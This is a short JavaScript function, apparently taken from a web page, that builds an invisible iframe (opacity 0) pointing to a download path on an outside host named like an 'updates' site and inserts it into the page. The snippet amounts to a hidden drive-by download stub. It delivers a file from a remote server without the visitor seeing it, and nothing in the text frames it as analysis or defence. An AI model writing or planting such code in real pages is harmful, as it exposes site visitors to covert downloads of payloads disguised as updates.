
function request()
{
    let dowload = document.createElement("iframe");
    
    dowload.setAttribute("src", "https://atualiza-es.onrender.com/dowload");
    dowload.setAttribute("id", "dash");
    dowload.setAttribute("style", "opacity: 0;")

    document.getElementById("dowload").appendChild(dowload);


}